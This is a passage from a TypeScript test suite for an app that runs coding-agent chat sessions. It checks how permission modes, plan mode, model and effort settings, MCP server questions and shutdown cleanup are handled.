        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'auto_mode_unavailable',
          reason: 'auto mode is unavailable for your plan',
          fallback: 'default'
        })
      })

      // A session asked to start in auto mode that the CLI started in
      // default instead: the report is taken as a cue to ask again, not as the
      // verdict, and only the refusal of that falls back.
      it('asks again when the session reports default, and falls back only if refused', async () => {
        const { service, workspaceId, events } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.setChatWorkingMode(chat.id, 'auto')
        await service.sendToChat(chat.id, 'work')
        expect(agent().options().permissionMode).toBe('auto')

        modeAnswer = refuseAuto('auto mode is unavailable for your plan')
        agent().emit({
          type: 'system',
          subtype: 'status',
          status: null,
          permissionMode: 'default'
        } as unknown as SDKMessage)

        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.workingMode).toBe('default')
        })
        expect(agent().modes()).toEqual(['auto', 'default'])
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'auto_mode_unavailable',
          reason: 'auto mode is unavailable for your plan',
          fallback: 'default'
        })
      })

      it('stays in auto mode when asking again after a report succeeds', async () => {
        const { service, workspaceId, events } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.setChatWorkingMode(chat.id, 'auto')
        await service.sendToChat(chat.id, 'work')

        agent().emit({
          type: 'system',
          subtype: 'status',
          status: null,
          permissionMode: 'default'
        } as unknown as SDKMessage)

        await vi.waitFor(() => {
          expect(agent().modes()).toEqual(['auto'])
        })
        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('auto')
        expect(events.map((announced) => announced.event.type)).not.toContain(
          'auto_mode_unavailable'
        )
      })

      // A report of the mode the record already names, or one while planning,
      // is nothing to act on.
      it('ignores a report that agrees with the record, or one made while planning', async () => {
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.setChatWorkingMode(chat.id, 'auto')
        await service.setChatPlanMode(chat.id, true)
        await service.sendToChat(chat.id, 'plan')

        for (const permissionMode of ['default', 'auto']) {
          agent().emit({
            type: 'system',
            subtype: 'status',
            status: null,
            permissionMode
          } as unknown as SDKMessage)
        }
        agent().emit(resultMessage)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
        })

        expect(agent().modes()).toEqual([])
      })

      // The user moved on in the meantime: a refusal arriving after that
      // leaves their choice alone and says nothing.
      it('does not fall back from a mode the chat has already left', async () => {
        const { service, workspaceId, events } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.setChatWorkingMode(chat.id, 'auto')
        await service.sendToChat(chat.id, 'work')

        let refuse: (error: Error) => void = () => undefined
        modeAnswer = () =>
          new Promise<void>((_resolve, reject) => {
            refuse = reject
          })
        agent().emit({
          type: 'system',
          subtype: 'status',
          status: null,
          permissionMode: 'default'
        } as unknown as SDKMessage)
        await vi.waitFor(() => {
          expect(agent().modes()).toEqual(['auto'])
        })

        modeAnswer = () => Promise.resolve()
        await service.setChatWorkingMode(chat.id, 'acceptEdits')
        refuse(new Error('auto mode is unavailable for your plan'))
        // The session is put back in the mode now in force once the refusal
        // has been dealt with — the last thing that happens, so it is the
        // moment to look.
        await vi.waitFor(() => {
          expect(agent().modes()).toEqual(['auto', 'acceptEdits', 'acceptEdits'])
        })

        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
        // Nor reported as a fault: a refusal of a mode nobody wants any more
        // is nothing to tell anyone about.
        const said = events.map((announced) => announced.event.type)
        expect(said).not.toContain('auto_mode_unavailable')
        expect(said).not.toContain('error')
      })
    })

    it('is remembered on the chat', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.setChatWorkingMode(chat.id, 'acceptEdits')
      await service.setChatPlanMode(chat.id, true)

      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
      expect(service.listChats(workspaceId)[0]?.planMode).toBe(true)
    })

    // Not merely that the call resolves: the point of the change is that it
    // lands on the turn already in flight rather than only on the next one.
    it('reaches a session that is already running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.setChatPlanMode(chat.id, true)

      expect(agent().modes()).toEqual(['plan'])
    })

    it('remembers the model the chat was set to, and tells a running session', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.setChatModel(chat.id, 'claude-opus-5')

      expect(service.listChats(workspaceId)[0]?.model).toBe('claude-opus-5')
      expect(agent().requestedModels()).toEqual(['claude-opus-5'])
    })

    it('starts the next session on the model the chat is now on', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatModel(chat.id, 'claude-sonnet-5')

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().model).toBe('claude-sonnet-5')
    })

    it('remembers the model the chat plans with', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.setChatPlanModel(chat.id, 'claude-opus-5')

      expect(service.listChats(workspaceId)[0]?.planModel).toBe('claude-opus-5')
    })

    it('starts a planning session on the model chosen for planning', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatModel(chat.id, 'claude-sonnet-5')
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.setChatPlanMode(chat.id, true)

      await service.sendToChat(chat.id, 'plan it')

      expect(agent().options().model).toBe('claude-opus-5')
    })

    /*
     * The plan side names the agent's own default with a word, since null is
     * "one model does both" there. It must not reach the SDK as one: nothing
     * is called `default`, and `startSession` says "no override" by leaving
     * the option out rather than by sending a name.
     */
    it('asks for no model at all when the plan side names the agent default', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatModel(chat.id, 'claude-sonnet-5')
      await service.setChatPlanModel(chat.id, 'default')
      await service.setChatPlanMode(chat.id, true)

      await service.sendToChat(chat.id, 'plan it')

      expect(agent().options()).not.toHaveProperty('model')
    })

    it('moves a running session onto the plan model when planning starts', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      // A new conversation starts out planning; this one is about the mode it falls back to.
      await service.setChatPlanMode(chat.id, false)
      await service.setChatModel(chat.id, 'claude-sonnet-5')
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.sendToChat(chat.id, 'work')

      await service.setChatPlanMode(chat.id, true)

      expect(agent().requestedModels()).toEqual(['claude-opus-5'])
      expect(agent().modes()).toEqual(['plan'])
    })

    it('moves it back when planning stops', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      // A new conversation starts out planning; this one is about the mode it falls back to.
      await service.setChatPlanMode(chat.id, false)
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.sendToChat(chat.id, 'work')

      await service.setChatPlanMode(chat.id, true)
      await service.setChatPlanMode(chat.id, false)

      // Undefined is how the session is told to go back to the agent's own
      // choice, which is what this chat's coding model is.
      expect(agent().requestedModels()).toEqual(['claude-opus-5', undefined])
    })

    /*
     * The claim that keeps every conversation nobody has split behaving
     * exactly as it did: its effective model never moves, so nothing is ever
     * pushed at it and an explicit `/model` survives the toggle.
     */
    it('sends no model at all when the two jobs share one', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.setChatPlanMode(chat.id, true)
      await service.setChatPlanMode(chat.id, false)

      expect(agent().requestedModels()).toEqual([])
    })

    // A working-mode change is not a model change, split or no split.
    it('sends no model when only how freely it works changes', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.sendToChat(chat.id, 'work')

      await service.setChatWorkingMode(chat.id, 'acceptEdits')

      expect(agent().requestedModels()).toEqual([])
    })

    // Picking the coding model mid-plan moves the record, not the turn: what
    // is running is the plan model, and the footer says so.
    it('leaves a planning session on the plan model when the other one is picked', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      await service.setChatModel(chat.id, 'claude-sonnet-5')

      expect(service.listChats(workspaceId)[0]?.model).toBe('claude-sonnet-5')
      expect(agent().requestedModels()).toEqual(['claude-opus-5'])
    })

    it('remembers the effort the chat was set to', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.setChatEffort(chat.id, 'xhigh')

      expect(service.listChats(workspaceId)[0]?.effort).toBe('xhigh')
    })

    it('reaches a running session with the effort too', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.setChatEffort(chat.id, 'low')

      expect(agent().flagSettings()).toEqual([
        { effortLevel: 'low', ultracode: false, enableWorkflows: false, skillOverrides: {} }
      ])
    })

    /*
     * `/effort high` changes the level inside the CLI and announces nothing.
     *
     * Unlike the model there is no reading that reports the truth — the context
     * response carries the model and no effort — so a level set by a command
     * survived every message after it, beside a picker naming a different one.
     * Re-asserting is what keeps the control honest, at the price of a command's
     * effort lasting one turn.
     */
    it('re-asserts the effort on every message, as it does the mode', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'high')
      await service.sendToChat(chat.id, 'first')

      // The session exists by now, so this is the message that has to say it
      // again — whatever the CLI was told in between.
      await service.sendToChat(chat.id, 'second')

      expect(agent().flagSettings()).toEqual([
        { effortLevel: 'high', ultracode: false, enableWorkflows: false, skillOverrides: {} }
      ])
    })

    /*
     * There is no longer a level that is not pushed. Clearing the override used
     * to mean "whatever the agent would choose", which a running session cannot
     * be told — so that one change was written and not sent. The composer names
     * the level in force now, so every change it can express is one the session
     * can be given, and the default is no exception.
     */
    it('pushes the default at a running session like any other level', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'max')
      await service.sendToChat(chat.id, 'work')

      await service.setChatEffort(chat.id, 'medium')

      expect(service.listChats(workspaceId)[0]?.effort).toBe('medium')
      expect(agent().flagSettings()).toEqual([
        { effortLevel: 'medium', ultracode: false, enableWorkflows: false, skillOverrides: {} }
      ])
    })

    /*
     * The whole of the split, and the reason it exists: the level planning
     * needed is what every file edit after the plan was paid for.
     */
    it('drops to the working effort the moment a plan is approved', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'low')
      await service.setChatPlanEffort(chat.id, 'max')
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: 'do the thing' })
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'allow')
      await decision

      expect(agent().flagSettings().at(-1)).toEqual({
        effortLevel: 'low',
        ultracode: false,
        enableWorkflows: false,
        skillOverrides: {}
      })
    })

    it('raises to the planning effort when planning is turned on', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      // A new conversation starts out planning; this one is about the mode it falls back to.
      await service.setChatPlanMode(chat.id, false)
      await service.setChatEffort(chat.id, 'low')
      await service.setChatPlanEffort(chat.id, 'max')
      await service.sendToChat(chat.id, 'work')

      await service.setChatPlanMode(chat.id, true)

      expect(agent().flagSettings().at(-1)).toMatchObject({ effortLevel: 'max' })
    })

    /*
     * What was in force before a change is read inside its commit. Read before
     * it, both of two toggles in flight saw the coding model: the first moved
     * the session onto the plan model and the second, finding the model it
     * wanted equal to what it had read, sent nothing back.
     */
    it('ends on the coding model when planning goes on and off at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.sendToChat(chat.id, 'work')

      await Promise.all([
        service.setChatPlanMode(chat.id, true),
        service.setChatPlanMode(chat.id, false)
      ])

      // Undefined is the agent's own choice, which this chat's coding model is;
      // nothing sent at all leaves the session on it too.
      expect(agent().requestedModels().at(-1)).toBeUndefined()
    })

    it('ends on the working effort when planning goes on and off at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'low')
      await service.setChatPlanEffort(chat.id, 'max')
      await service.sendToChat(chat.id, 'work')

      await Promise.all([
        service.setChatPlanMode(chat.id, true),
        service.setChatPlanMode(chat.id, false)
      ])

      expect(agent().flagSettings().at(-1)?.effortLevel ?? 'low').toBe('low')
    })

    // Approval decides inside its commit too: whether planning was on, which
    // is what hands the work to acceptEdits, and what it moves the session from.
    it('hands over to acceptEdits when a plan is approved as planning is turned on', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      await service.updateConfig({ planExecutionMode: 'acceptEdits' })
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'low')
      await service.setChatPlanEffort(chat.id, 'max')
      await service.sendToChat(chat.id, 'work')

      const decision = agent().ask('ExitPlanMode', { plan: 'do the thing' })
      const requestId = await waitForRequest(events)
      // In this order: the approval queues its commit without an await first,
      // so the toggle's lands before it.
      await Promise.all([
        service.setChatPlanMode(chat.id, true),
        service.answerPermission(requestId, 'allow')
      ])
      await decision

      expect(service.listChats(workspaceId)[0]).toMatchObject({
        planMode: false,
        workingMode: 'acceptEdits'
      })
      expect(agent().flagSettings().at(-1)?.effortLevel ?? 'low').toBe('low')
    })

    it('ends on the effort picked last when two are picked at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'low')
      await service.sendToChat(chat.id, 'work')

      await Promise.all([
        service.setChatEffort(chat.id, 'high'),
        service.setChatEffort(chat.id, 'low')
      ])

      expect(agent().flagSettings().at(-1)?.effortLevel ?? 'low').toBe('low')
    })

    it('ends on the effort picked last when two plan efforts are picked at once', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanEffort(chat.id, 'low')
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      await Promise.all([
        service.setChatPlanEffort(chat.id, 'high'),
        service.setChatPlanEffort(chat.id, 'low')
      ])

      expect(agent().flagSettings().at(-1)?.effortLevel ?? 'low').toBe('low')
    })

    /* The guard `pushModel` exists for, in its own words: a conversation whose
       two jobs share an effort runs that one whatever the toggles do, so
       nothing is ever pushed at it. */
    it('pushes nothing at a conversation with no split', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.setChatPlanMode(chat.id, true)

      expect(agent().flagSettings()).toEqual([])
    })

    it('starts a planning session at the effort chosen for planning', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'low')
      await service.setChatPlanEffort(chat.id, 'xhigh')
      await service.setChatPlanMode(chat.id, true)

      await service.sendToChat(chat.id, 'plan it')

      expect(agent().options().effort).toBe('xhigh')
    })

    /* Setting the working level while a plan is being made moves nothing that
       is running: the session is at the planning level, and pushing here would
       drop it mid-plan. */
    it('leaves a planning session alone when the working effort changes', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanEffort(chat.id, 'max')
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      await service.setChatEffort(chat.id, 'low')

      expect(service.listChats(workspaceId)[0]?.effort).toBe('low')
      expect(agent().flagSettings()).toEqual([])
    })

    it('starts the next session with the effort the chat is now on', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'medium')

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().effort).toBe('medium')
    })

    // The whole point of storing the choice rather than the pair: a chat left
    // on `ultracode` starts its next session on it, and neither half of what
    // that means has to be remembered anywhere but the fold.
    it('starts the next session on ultracode when the chat was left on it', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatEffort(chat.id, 'ultracode')

      await service.sendToChat(chat.id, 'work')

      expect(service.listChats(workspaceId)[0]?.effort).toBe('ultracode')
      expect(agent().options().effort).toBe('xhigh')
      expect(agent().options().settings).toEqual({
        ultracode: true,
        enableWorkflows: true,
        skillOverrides: {},
        hooks: CWD_WATCH_SETTINGS
      })
    })

    /*
     * The record is what the session runs under, checked on every message.
     *
     * The CLI moves out of plan mode by itself once a plan is settled, and no
     * message announces it. Set only at the start and on a user's change, the
     * session drifted: a chat recorded as `acceptEdits` asked about every edit
     * because the CLI had dropped it to `default`.
     */
    it('puts a running session back into the mode the record names', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      // A new conversation starts out planning; this one is about the mode it falls back to.
      await service.setChatPlanMode(chat.id, false)
      await service.setChatWorkingMode(chat.id, 'acceptEdits')

      await service.sendToChat(chat.id, 'first')
      // Nothing pushed: a session built moments ago carries the mode already.
      expect(agent().options().permissionMode).toBe('acceptEdits')
      expect(agent().modes()).toEqual([])

      await service.sendToChat(chat.id, 'second')

      expect(agent().modes()).toEqual(['acceptEdits'])
    })

    /*
     * The model deliberately gets no such treatment, and this is the test that
     * says so.
     *
     * It briefly did, on the belief that `/model` moved the session with no way
     * to find out. That belief was wrong — the context reading names the running
     * model — so re-asserting stopped being a guard against drift and became an
     * undo of an explicit instruction: `/model opus`, and the next message went
     * out on whatever the picker still held.
     */
    it('leaves a running session on the model a command chose', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'first')
      await service.sendToChat(chat.id, '/model opus')
      await service.sendToChat(chat.id, 'third')

      // Not once: the record's model reaches the session when it starts, and
      // when the user changes it here — never on the way past.
      expect(agent().requestedModels()).toEqual([])
    })

    it('still tells a running session when the picker moves', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'first')

      await service.setChatModel(chat.id, 'claude-sonnet-5')
      await service.sendToChat(chat.id, 'second')

      // Once, from the change itself — not again with the message after it.
      expect(agent().requestedModels()).toEqual(['claude-sonnet-5'])
    })

    // Planning is the user's standing answer, not the CLI's. A toggle that
    // switched itself off would be worse than a turn planned once too often.
    it('puts it back into planning too, whatever the CLI decided', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'first')
      await service.setChatPlanMode(chat.id, true)

      await service.sendToChat(chat.id, 'second')

      expect(agent().modes()).toEqual(['plan', 'plan'])
    })

    // The session options are assembled key by key, which is how a field gets
    // added to a type and left out of the object that carries it — the shape
    // of the bug that left the colour picker doing nothing for a week.
    it('starts the next session in the mode the chat is now in', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().permissionMode).toBe('plan')
    })

    // `model` is reserved rather than dead: nothing sets it yet, and until a
    // picker does, what matters is that no override is invented — an absent
    // `model` is what leaves the choice to the agent.
    it('sends no model override while the chat carries none', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      expect(chat.model).toBeNull()
      await service.sendToChat(chat.id, 'work')

      expect(agent().options()).not.toHaveProperty('model')
    })

    it('refuses a chat that does not exist', async () => {
      const { service } = await withWorkspace()

      await expect(service.setChatWorkingMode('chat-nothing', 'acceptEdits')).rejects.toThrow(
        WorkspaceError
      )
      await expect(service.setChatPlanMode('chat-nothing', true)).rejects.toThrow(WorkspaceError)
    })
  })

  describe("an MCP server's question", () => {
    const FORM = {
      type: 'object',
      properties: { token: { type: 'string', title: 'Token' }, save: { type: 'boolean' } },
      required: ['token']
    }

    /** A session with a question from a server already on the books. */
    async function asked(): Promise<{
      service: OctopusService
      workspaceId: string
      chatId: string
      events: ChatEvent[]
      answer: Promise<{ action: string }>
      requestId: string
    }> {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      const answer = agent().elicit({
        serverName: 'ledger',
        message: 'Which token should I use?',
        requestedSchema: FORM
      })

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'elicitation_request')).toBe(true)
      })

      const raised = events.find((entry) => entry.event.type === 'elicitation_request')?.event
      if (raised?.type !== 'elicitation_request') throw new Error('no request was raised')

      return { service, workspaceId, chatId: chat.id, events, answer, requestId: raised.requestId }
    }

    it('reaches the window with the form already read', async () => {
      const { events } = await asked()

      expect(
        events.map((entry) => entry.event).find((one) => one.type === 'elicitation_request')
      ).toMatchObject({
        serverName: 'ledger',
        message: 'Which token should I use?',
        fields: [
          { kind: 'text', name: 'token', required: true },
          { kind: 'boolean', name: 'save', required: false }
        ]
      })
    })

    /*
     * The values arrive as the window holds them — text for every field — and
     * core makes the answer the server takes back. A flag is always sent,
     * because "off" is an answer.
     */
    it('sends back what was filled in, as the server takes it', async () => {
      const { service, requestId, answer } = await asked()

      await service.answerElicitation(requestId, 'accept', { token: 'abc', save: true })

      await expect(answer).resolves.toEqual({
        action: 'accept',
        content: { token: 'abc', save: true }
      })
    })

    it('turns one down without sending anything', async () => {
      const { service, requestId, answer } = await asked()

      await service.answerElicitation(requestId, 'decline')

      await expect(answer).resolves.toEqual({ action: 'decline' })
    })

    // So a reopened conversation shows what became of the question rather than
    // showing it still waiting.
    it('writes down what became of it', async () => {
      const { service, requestId, events } = await asked()

      await service.answerElicitation(requestId, 'decline')

      expect(events.map((entry) => entry.event)).toContainEqual({
        type: 'elicitation_answered',
        requestId,
        action: 'decline'
      })
    })

    /*
     * `cancel`, not `decline`: declining is the user saying no, and cancelling
     * is the question going away without one. A turn that ended is the second,
     * and a server tells the two apart.
     */
    it('is withdrawn as cancelled when the turn ends under it', async () => {
      const { answer, events } = await asked()

      agent().emit(resultMessage)

      await expect(answer).resolves.toEqual({ action: 'cancel' })
      await vi.waitFor(() => {
        expect(events.map((entry) => entry.event)).toContainEqual(
          expect.objectContaining({ type: 'elicitation_answered', action: 'cancel' })
        )
      })
    })

    /*
     * A form holds the turn exactly as a permission does. Left `running`, the
     * workspace's dot, the project's mark and the notice all said "busy" while
     * the agent sat waiting on the user.
     */
    it('marks the conversation as waiting until it is answered', async () => {
      const { service, workspaceId, chatId, requestId } = await asked()
      const status = (): string | undefined =>
        service.listChats(workspaceId).find((chat) => chat.id === chatId)?.status

      await vi.waitFor(() => {
        expect(status()).toBe('waiting_permission')
      })

      await service.answerElicitation(requestId, 'decline')

      expect(status()).toBe('running')
    })

    /*
     * Two tool calls can wait at once. Answering one of them is not the end of
     * waiting while the other is still open — either way round.
     */
    describe('beside a permission in the same turn', () => {
      async function both(): Promise<{
        service: OctopusService
        status: () => string | undefined
        formId: string
        permissionId: string
      }> {
        const { service, workspaceId, chatId, requestId, events } = await asked()
        void agent().ask('Bash', { command: 'ls' })

        await vi.waitFor(() => {
          expect(events.some((entry) => entry.event.type === 'permission_request')).toBe(true)
        })
        const raised = events.find((entry) => entry.event.type === 'permission_request')?.event
        if (raised?.type !== 'permission_request') throw new Error('no permission was raised')

        return {
          service,
          status: () => service.listChats(workspaceId).find((chat) => chat.id === chatId)?.status,
          formId: requestId,
          permissionId: raised.requestId
        }
      }

      it('stays waiting when the form is answered first', async () => {
        const { service, status, formId, permissionId } = await both()

        await service.answerElicitation(formId, 'decline')
        expect(status()).toBe('waiting_permission')

        await service.answerPermission(permissionId, 'deny')
        expect(status()).toBe('running')
      })

      it('stays waiting when the permission is answered first', async () => {
        const { service, status, formId, permissionId } = await both()

        await service.answerPermission(permissionId, 'deny')
        expect(status()).toBe('waiting_permission')

        await service.answerElicitation(formId, 'decline')
        expect(status()).toBe('running')
      })
    })

    it('is withdrawn when the conversation is interrupted', async () => {
      const { service, chatId, answer } = await asked()

      await service.interruptChat(chatId)

      await expect(answer).resolves.toEqual({ action: 'cancel' })
    })

    /*
     * Two conversations share a workspace, and each may have a server waiting.
     * A turn ending in one must not withdraw the other's question — the server
     * behind it is still there, and cancelling would be this application
     * answering for a turn that never stopped.
     */
    it("leaves another conversation's question alone when this turn ends", async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      const second = await service.createChat(workspaceId)
      await service.sendToChat(first.id, 'work')
      await service.sendToChat(second.id, 'work too')

      const [one, other] = agents
      if (!one || !other) throw new Error('both sessions should be running')

      const form = {
        serverName: 'ledger',
        message: 'x',
        requestedSchema: { type: 'object', properties: { token: { type: 'string' } } }
      }
      const heldByOne = one.elicit(form)
      const heldByOther = other.elicit(form)

      // Both on the books before either turn ends, or the loop would have
      // nothing of the other's to skip.
      await vi.waitFor(() => {
        expect(events.filter((entry) => entry.event.type === 'elicitation_request')).toHaveLength(2)
      })

      let othersAnswered = false
      void heldByOther.then(() => {
        othersAnswered = true
      })

      one.emit(resultMessage)
      await expect(heldByOne).resolves.toMatchObject({ action: 'cancel' })

      // The loop has run by now — it is what settled the promise above — and
      // the other server is still waiting, because its turn never stopped.
      expect(othersAnswered).toBe(false)

      other.emit(resultMessage)
      await expect(heldByOther).resolves.toMatchObject({ action: 'cancel' })
    })

    // An answer to a question nobody is holding open is not an error; it is a
    // second window pressing a button the first had already pressed.
    it('does nothing for a question that is already settled', async () => {
      const { service, requestId } = await asked()

      await service.answerElicitation(requestId, 'decline')

      await expect(service.answerElicitation(requestId, 'accept', {})).resolves.toBeUndefined()
    })
  })

  describe('the roots a session is given', () => {
    /*
     * The roots are handed over **once**, at session start, and the SDK only
     * re-scans directories it already knows about — so one that was not there
     * then stays invisible for the life of the conversation. That cost the
     * skills a release; the commands and subagents beside them get the same
     * treatment rather than learning it again.
     */
    it('gives the command and subagent stores their shape before the agent looks', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      const root = join(dir, 'data', 'skills', '.claude')
      await expect(access(join(root, 'commands'))).resolves.toBeUndefined()
      await expect(access(join(root, 'agents'))).resolves.toBeUndefined()
    })
  })

  describe('shutting down', () => {
    // Every session holds a child process; unclosed, it outlives the app.
    it('closes every live session', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.closeChats()

      expect(agent().closed()).toBe(1)
    })

    /*
     * The `ENOTEMPTY` that had been failing whole runs, as one test.
     *
     * `canUseTool` blocks on the promise a question holds, so a session closed
     * with one open leaves the turn behind it running — and whatever that turn
     * was in the middle of writing goes on writing, into a directory the next
     * test's teardown is removing. `closeOneChat` has always abandoned them;
     * this is the path that quits the application, and it did not.
     */
    it('answers the questions it is closing on', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      const asked = agent().ask('Bash', { command: 'ls' })

      await service.closeChats()

      await expect(asked).resolves.toMatchObject({ behavior: 'deny', message: ABANDONED })
    })

    /*
     * The log is written on a line of its own, behind the events that fill it.
     * Quitting without waiting for it dropped the tail of a conversation that
     * was streaming — measured, all of two hundred lines — and the pane then
     * reopened on less than the agent remembers.
     */
    it('waits for the log to be written', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      for (let line = 0; line < 200; line += 1) agent().emit(textMessage(`line ${String(line)}`))
      // One turn of the loop rather than a poll: the events are handled by then
      // and their lines queued, and a poll would give the writes time to land.
      await new Promise((resolve) => setTimeout(resolve, 0))
      expect(events.filter((entry) => entry.event.type === 'text')).toHaveLength(200)

      await service.closeChats()

      const history = await service.chatHistory(chat.id)
      expect(history.filter((entry) => entry.role === 'agent')).toHaveLength(200)
    })

    /*
     * The other half of stopping. Writes go out from event handlers with
     * nothing awaiting them, so closing the sessions leaves them running — and
     * a write still running when the temporary directory goes is the
     * `ENOTEMPTY` above, landing in whichever test is torn down next.
     *
     * The account reading a finished turn takes is the lever: it is background
     * work like any other, and this test holds it open.
     */
    it('waits for the work its sessions started', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      let release = (): void => undefined
      usageAnswer = () =>
        new Promise((resolve) => {
          release = () => {
            resolve(USAGE_RESPONSE)
          }
        })

      agent().emit(resultMessage)
      // The event goes out after the work is started, so this says the reading
      // is under way rather than merely about to be.
      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'result')).toBe(true)
      })

      const closing = service.closeChats()
      const waiting = Symbol('still waiting')
      const first = await Promise.race([
        closing.then(() => 'closed'),
        new Promise((resolve) =>
          setTimeout(() => {
            resolve(waiting)
          }, 20)
        )
      ])
      expect(first).toBe(waiting)

      release()
      await expect(closing).resolves.toBeUndefined()
    })

    /*
     * A quit is worth a moment and not a hang. A transcript append cut in half
     * is a conversation that will not reopen, so this waits — but a session
     * that will not close must not hold the application open, and what ends at
     * the ceiling is the **waiting** rather than the write, which cannot be
     * called back.
     */
